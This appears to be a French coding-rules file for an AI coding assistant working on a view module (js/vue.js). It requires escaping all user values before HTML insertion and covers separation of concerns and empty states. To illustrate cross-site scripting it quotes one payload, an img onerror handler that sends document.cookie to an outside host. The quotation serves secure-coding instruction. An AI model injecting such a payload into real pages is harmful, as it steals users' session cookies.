---
applyTo: "js/vue.js"
---

# Règle absolue de ce fichier

**Toute valeur venue de l'utilisateur passe par `echapper()` avant d'entrer
dans une chaîne HTML.** Sans exception, y compris pour un identifiant ou
un nombre.

Sans cela, un contact nommé
`<img src=x onerror="fetch('https://ailleurs/'+document.cookie)">`
exécute ce code chez toutes les personnes qui ouvrent la fiche.
C'est la faille XSS, la plus répandue du web.

Ce fichier **ne calcule rien**. Il reçoit des données déjà prêtes et les met
en forme. S'il te faut un total, un tri ou un filtre, il manque une fonction
dans `statistiques.js` ou `depot.js` : c'est là qu'il faut l'écrire.

Prévois toujours l'**état vide** : une liste sans résultat affiche un message
utile, jamais un tableau nu. C'est le premier écran que voit un nouvel
utilisateur, et un tableau vide sans explication ressemble à un bug.
